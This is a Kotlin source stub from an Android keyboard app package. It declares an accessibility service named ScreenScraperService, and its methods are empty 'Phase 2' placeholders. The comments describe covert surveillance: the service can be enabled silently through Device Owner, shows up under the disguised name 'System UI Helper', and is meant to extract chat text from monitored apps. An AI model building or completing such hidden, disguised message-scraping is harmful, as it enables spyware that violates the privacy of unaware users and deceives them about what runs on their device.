package com.safetype.keyboard

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

/**
 * Phase 2 stub — AccessibilityService for screen scraping visible text.
 * Declared in manifest (disabled) so Device Owner can enable it silently.
 * Appears as "System UI Helper" in Accessibility settings.
 */
class ScreenScraperService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Phase 2: traverse UI tree, extract chat text from monitored apps
    }

    override fun onInterrupt() {
        // Phase 2
    }
}
